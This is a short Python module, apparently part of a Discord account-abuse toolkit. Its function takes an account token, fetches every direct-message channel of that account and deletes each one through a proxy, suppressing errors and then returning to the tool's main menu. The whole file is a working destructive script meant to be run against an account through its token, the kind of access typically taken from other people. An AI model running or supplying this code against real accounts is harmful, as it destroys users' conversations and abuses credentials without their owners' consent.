

import requests
import json

from colorama import Fore

import Solutions
from util.plugins.common import print_slow, getheaders, proxy

def DmDeleter(token):
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
            proxies={"ftp": f'{proxy()}'},
            headers=getheaders(token))
            print(f"{Fore.RED}Deleted DM: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print_slow(f"{Fore.RED}Deleted all available DM's ")
    print("Enter anything to continue. . . ", end="")
    input()
    Solutions.main()